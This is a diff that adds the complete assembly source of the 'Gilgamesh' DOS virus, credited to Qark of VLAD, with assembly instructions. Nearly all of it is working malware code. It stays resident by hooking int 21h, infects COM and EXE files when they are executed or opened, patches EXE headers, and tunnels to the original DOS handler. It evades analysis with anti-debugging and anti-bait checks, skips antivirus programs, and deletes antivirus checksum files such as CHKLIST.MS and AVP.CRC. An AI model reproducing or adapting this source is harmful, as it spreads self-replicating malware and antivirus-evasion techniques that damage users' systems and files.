@@ -1,0 +1,678 @@
+
+;
+;               Gilgamesh Virus
+;                     by
+;                 Qark [VLAD]
+;
+;
+; Gilgamesh does this stuff:
+;    Infects COM and EXE
+;    Deletes AV checksum files
+;    Contains anti-debugging code
+;    Uses recursive tunneling
+;    Doesn't infect AV programs
+;    Contains anti-bait code -
+;      (I invented these next two ideas I think)
+;      Won't infect files with numerics in the name
+;      Won't infect files/directories with 'vir' as part of the name
+;      Won't infect files with todays date.
+;    Highly polymorphic (Will discuss the engine separately)
+;
+;
+; The DOS interrupt call at the beginning of the virus serves 4 purposes.
+;  1) It does the residency check
+;  2) It gets the DOS segment for the tunneller
+;  3) The return from the int leaves the delta offset on the stack
+;  4) Performs anti-debugging, because debuggers will destroy the stack
+;
+; Gilgamesh is named after the God-Emperor of Mesopotamia.
+;
+; Assemble using a86. It will want an include file 'vipz.asm', which is the
+; next article.
+
+
+
+
+
+        org     0
+
+        ;Get DOS list of lists & our residency check.
+        mov     ax,5253h
+        int     21h
+our_offset:
+        cld
+
+        ;Anti-Debugging, Anti-Heuristic way of getting our delta offset.
+        mov     bp,sp
+        mov     di,[bp-6]
+        sub     di,offset our_offset
+
+        ;DI = delta offset
+        mov     si,di
+        cmp     ax,5352h
+        jne     not_resident
+        push    ds
+        pop     es
+        jmp     exit_virus
+not_resident:
+        mov     word ptr [di+loopcount],0
+
+        mov     word ptr [di+dosseg],es
+
+        push    ds
+        pop     es
+
+        ;0008:0004 is the int21 vector address.
+        mov     ax,8
+        mov     ds,ax
+        mov     si,4
+
+        ;Save int 21 address incase we can't find it.
+        mov     ax,word ptr [si]
+        mov     word ptr cs:[di+adr21],ax
+        mov     ax,word ptr [si+2]
+        mov     word ptr cs:[di+adr21+2],ax
+
+        ;Recursive Tunneler.
+        ;
+        ;The loop below traces through the int 21 code looking for the
+        ;original handler.
+
+get32ptr:
+        ;DS:SI points to int 21h
+        lds     si,ds:[si]
+        mov     ax,ds
+        cmp     ax,word ptr cs:[di+dosseg]
+        je      founddos
+next_opcode:
+        lodsb
+
+        cmp     al,0eah                 ;JMP FAR PTR
+        je      get32ptr
+        cmp     al,9ah                  ;CALL FAR PTR
+        je      get32ptr
+
+        inc     word ptr cs:[di+loopcount]
+        cmp     word ptr cs:[di+loopcount],1000
+        je      nodos
+        jmp     next_opcode
+
+founddos:
+        mov     word ptr cs:[di+adr21],si
+        mov     word ptr cs:[di+adr21+2],ds
+nodos:
+        mov     si,di
+        xor     di,di
+
+        ;Get MCB seg.
+        mov     ax,es
+        dec     ax
+        mov     ds,ax
+
+        ;'Z' MCB.
+        cmp     byte ptr [di],'Y'
+        jb      exit_virus
+        sub     word ptr [di+12h],((offset virus_size/10h)+1)*3
+        sub     word ptr [di+3],((offset virus_size/10h)+1)*3
+        mov     ax,word ptr [di+12h]
+        push    es
+        mov     es,ax
+
+        push    cs
+        pop     ds
+        
+        push    si
+
+        mov     cx,offset virus_size
+        rep     movsb
+
+        ;Set int 21.
+        mov     ds,cx
+        mov     si,21h*4
+        mov     di,offset i21
+        movsw
+        movsw
+
+        mov     word ptr [si-4],offset int21handler
+        mov     word ptr [si-2],es
+
+        pop     si
+        pop     es
+
+exit_virus:
+        push    es
+        pop     ds
+
+        ;If CS != SS then it must be EXE.
+        mov     ax,cs
+        mov     bx,ss
+        
+        cmp     ax,bx
+        jne     exe_exit
+
+com_exit:
+        mov     di,100h-2
+        scasw
+        push    di
+        mov     ax,1111h
+        org     $-2
+first2  dw      20cdh
+        stosw
+        mov     ax,1111h
+        org     $-2
+third   dw      90h
+        stosw
+
+zero_regs:
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,di
+
+        ret
+
+exe_exit:
+
+        mov     ax,ds
+        add     ax,10h
+        add     word ptr cs:[si+offset exe_return+2],ax
+
+        call    zero_regs
+
+        mov     ax,ds
+        add     ax,10h
+        
+        add     ax,0
+        org     $-2
+orig_ss dw      0
+        mov     ss,ax
+
+        mov     sp,0
+        org     $-2
+orig_sp dw      0
+
+        jmp     short $+2
+        xor     ax,ax
+        
+        db      0eah            ;JMP FAR PTR
+exe_return      dd      0
+
+sig     db      ' =Gilgamesh= by Qark - A VLAD Australia Production'
+
+Int21handler:
+        cmp     ax,5253h
+        jne     not_res_chk
+        xchg    ah,al
+        iret
+not_res_chk:
+        pushf
+        push    ax
+        xchg    ah,al
+        cmp     al,4bh
+        je      check_infect
+        cmp     al,6ch
+        je      check_infect
+        cmp     al,3dh
+        je      check_infect
+exit_handler:
+        pop     ax
+        popf
+        db      0eah
+i21     dd      0
+
+check_infect:
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+
+        cmp     al,6ch
+        jne     no_fix_6c
+        mov     dx,si
+no_fix_6c:
+
+        ;Get fully qualified filename.
+        mov     si,dx
+        mov     di,offset filename
+        push    cs
+        pop     es
+        mov     ah,60h
+        call    int21h
+
+        push    cs
+        pop     ds
+
+        cld
+
+        ;Calculate the length of the name string.
+        mov     di,offset filename
+        mov     al,0
+        mov     cx,129
+        repne   scasb
+
+        sub     di,offset filename
+        mov     word ptr namelength,di
+
+        mov     bx,'RI'
+
+        ;Search for the string, VIR
+        mov     al,'V'
+        mov     cx,word ptr namelength
+next_letter:
+        mov     di,offset filename
+        repne   scasb
+
+        jne     no_letter_found
+
+        cmp     word ptr [di],bx
+        jne     next_letter
+no_inf_jmp:
+        jmp     no_infection
+
+no_letter_found:
+
+        mov     di,offset filename
+        add     di,word ptr namelength
+
+        sub     di,4
+
+        cmp     word ptr [di],'XE'
+        jne     trycom
+        cmp     byte ptr [di+2],'E'
+        jne     no_inf_jmp
+        jmp     short found_exe
+trycom:
+        cmp     word ptr [di],'OC'
+        jne     no_inf_jmp
+        cmp     byte ptr [di+2],'M'
+        jne     no_inf_jmp
+found_exe:        
+        mov     al,'\'
+        std
+        mov     cx,14
+        repne   scasb
+
+        inc     di
+        inc     di
+
+        cld
+
+        mov     ax,word ptr [di]
+        cmp     ax,'CS'         ;SCan, SCandisk
+        je      no_inf_jmp2
+        cmp     ax,'BT'         ;TBscan, TBclean etc
+        je      no_inf_jmp2
+        cmp     ax,'-F'         ;F-prot
+        je      no_inf_jmp2
+        cmp     ax,'UG'         ;GUard (solomans)
+        je      no_inf_jmp2
+        cmp     ax,'VA'         ;AVp
+        je      no_inf_jmp2
+        cmp     ax,'VD'         ;DV
+        je      no_inf_jmp2
+        cmp     ax,'HC'         ;CHkxxx
+        je      no_inf_jmp2
+        cmp     ax,'RP'         ;PRogman.exe
+        je      no_inf_jmp2
+
+;Now make sure there are no numerics in the filename.
+        mov     si,di
+oknumeral:
+        lodsb
+
+        cmp     al,'.'
+        je      done_name
+        cmp     al,'0'
+        jb      oknumeral
+        cmp     al,'9'
+        ja      oknumeral
+no_inf_jmp2:
+        jmp     no_infection
+done_name:
+        ;Remove readonly attribute.
+        mov     ax,143h
+        mov     dx,offset filename
+        xor     cx,cx
+        call    altint21h
+        jc      no_inf_jmp2
+        
+        ;Open file.
+        mov     ax,3d02h
+        call    int21h
+        jc      no_inf_jmp2
+
+        ;File handle into BX
+        xchg    bx,ax
+
+        ;Get date and time
+        mov     ah,2ah
+        call    int21h
+
+        ;Convert into file date format
+        xchg    cx,ax
+        sub     ax,1980
+        mov     cl,4
+        shl     ax,cl
+        or      al,dh
+        mov     cl,5
+        shl     ax,cl
+        or      al,dl
+
+        ;If file date = todays date, then don't infect.
+        push    ax
+        mov     ax,5700h
+        call    int21h
+        pop     cx
+        cmp     cx,dx
+        jne     save_time
+bad_time:
+        jmp     com_close_quit
+save_time:
+        mov     ax,5700h
+        call    int21h
+        mov     word ptr time,cx
+        mov     word ptr date,dx
+
+        mov     ah,3fh
+        mov     dx,offset readbuffer
+        mov     cx,100
+        call    int21h
+        jc      bad_time
+
+        mov     si,offset readbuffer
+
+        ;Check for an EXE header.
+        mov     ax,word ptr [si]
+        or      ax,2020h                ;Convert 2 lower-case, anti-heuristic
+        cmp     ax,'zm'
+        je      exe_header
+        cmp     ax,'mz'
+        je      exe_header
+
+        ;Save the first 3 bytes.
+        lodsw        
+        mov     word ptr first2,ax
+        lodsw
+        mov     word ptr third,ax
+
+        cmp     ah,'V'
+        je      bad_time
+        
+        ;Lseek to the end.
+        call    lseek_end
+
+        ;Check the file size.
+        or      dx,dx
+        jnz     com_close_quit
+        cmp     ax,2000
+        jb      com_close_quit
+        cmp     ax,60000
+        ja      com_close_quit
+
+        push    ax
+        add     ax,100h
+        mov     word ptr delta,ax
+        pop     ax
+
+        ;Calculate the jump offset.
+        sub     ax,3
+        mov     word ptr new3+1,ax
+
+        mov     al,1
+
+        call    setup_poly
+
+        ;Write the virus.
+        mov     al,40h
+        mov     dx,offset stackend
+        call    altint21h
+        jc      com_close_quit
+
+        ;Lseek to the start.
+        call    lseek_start
+
+        ;Write the jump.
+        mov     al,40h
+        mov     cx,4
+        mov     dx,offset new3
+        call    altint21h
+
+        call    chksum_files
+time_close:
+        ;Restore time.
+        mov     ax,157h
+        mov     cx,word ptr time
+        mov     dx,word ptr date
+        call    altint21h
+        
+com_close_quit:
+        jmp     close_quit
+
+exe_header:
+        cmp     word ptr [si+1ah],0             ;Overlays.
+        jne     com_close_quit
+        cmp     word ptr [si+18h],40h           ;NewEXE
+        jae     com_close_quit
+        cmp     word ptr [si+0ch],0ffffh        ;Maxmem
+        jne     com_close_quit
+        cmp     word ptr [si+12h],0             ;Infected ?
+        jne     com_close_quit
+
+        mov     ax,word ptr [si+0eh]
+        mov     word ptr orig_ss,ax
+        mov     ax,word ptr [si+10h]
+        mov     word ptr orig_sp,ax             ;Saved the SS:SP
+
+        push    si
+        add     si,14h
+        mov     di,offset exe_return
+        movsw
+        movsw                           ;Saved the CS:IP
+        pop     si
+
+        call    lseek_end
+
+        ;Check for overlays.
+        push    dx
+        push    ax
+        mov     cx,512
+        div     cx
+        inc     ax
+        cmp     word ptr [si+4],ax
+        pop     ax
+        pop     dx
+        ja      com_close_quit
+
+        cmp     dx,7
+        ja      com_close_quit
+        or      dx,dx
+        jnz     no_small_check
+        cmp     ax,5000
+        jb      com_close_quit
+no_small_check:
+        mov     cx,16
+        div     cx
+
+        sub     ax,word ptr [si+8]
+
+        mov     word ptr [si+14h],dx
+        mov     word ptr [si+16h],ax
+
+        mov     word ptr delta,dx
+
+        add     dx,offset stackend-16
+        and     dx,0fffeh
+        inc     ax
+
+        mov     word ptr [si+0eh],ax
+        mov     word ptr [si+10h],dx
+
+        mov     al,0
+        call    setup_poly
+
+        mov     al,40h
+        mov     dx,offset stackend
+        call    altint21h
+        jc      close_quit
+
+        call    lseek_end
+
+        mov     cx,512
+        div     cx
+
+        or      dx,dx
+        jz      no_page_fix
+        inc     ax
+no_page_fix:
+        mov     word ptr [si+4],ax
+        mov     word ptr [si+2],dx
+zero_ax:
+        in      ax,40h
+        or      ax,ax
+        jz      zero_ax
+        mov     word ptr [si+12h],ax
+
+        call    lseek_start
+
+        mov     al,40h
+        mov     cx,1ch
+        mov     dx,si
+        call    altint21h
+
+        call    chksum_files
+
+        jmp     time_close
+
+close_quit:
+        ;Close file.
+        mov     ah,3eh
+        call    int21h
+
+no_infection:
+
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        jmp     exit_handler
+
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+altint21h:
+        xchg    ah,al           ;Backwards int 21
+int21h:
+        pushf
+        db      9ah
+adr21   dd      0
+        ret
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+lseek_start:
+        mov     al,0
+        jmp     short lseek
+lseek_end:
+        mov     al,2
+lseek:
+        mov     ah,42h
+        xor     cx,cx
+        cwd
+        call    int21h
+        ret
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+chksum_files:                   ;Deletes AV checksum files.
+        push    ax
+        push    cx
+        push    dx
+        push    si
+        push    di
+        
+        mov     di,offset filename
+        add     di,word ptr namelength
+        
+        ;Find \
+        std
+        mov     al,'\'
+        mov     cx,16
+        repne   scasb
+        cld
+        scasw                           ;ADD DI,2
+
+        mov     si,offset crc_files
+outer_crc:
+        push    di
+crc_loop:
+        movsb
+        cmp     byte ptr [si-1],0
+        jne     crc_loop
+        mov     ah,41h                  ;Delete file
+        mov     dx,offset filename
+        call    int21h
+        pop     di
+        cmp     si,offset end_crc
+        jb      outer_crc
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+
+crc_files       db      'ANTI-VIR.DAT',0
+                db      'CHKLIST.CPS',0
+                db      'CHKLIST.MS',0
+                db      'CHKLIST.TAV',0
+                db      'SMARTCHK.CPS',0
+                db      'AVP.CRC',0
+                db      'IVB.NTZ',0
+end_crc:
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+Setup_poly:
+;AL=1 if com file.
+;Returns CX=size to write plus stuff in stackend
+        push    ax
+        push    bx
+        push    dx
+        push    bp
+        push    si
+        push    di
+
+        xor     si,si
+        mov     di,offset stackend
+        mov     cx,offset virus_size
+        mov     bp,word ptr delta
+        call    vip
+
+        pop     di
+        pop     si
+        pop     bp
+        pop     dx
+        pop     bx
+        pop     ax
+        ret
+
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+include vipz.asm
+;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
+new3    db      0e9h,0,0,'V'
+
+delta   dw      0
+
+time    dw      0
+date    dw      0
+
+loopcount       dw      0
+dosseg          dw      0
+
+virus_size:
+namelength      dw      0
+filename        db      128 dup (0)
+readbuffer      db      128 dup (0)
+                db      (offset virus_size - ($-offset virus_size)) dup (0)
+stackend:
+
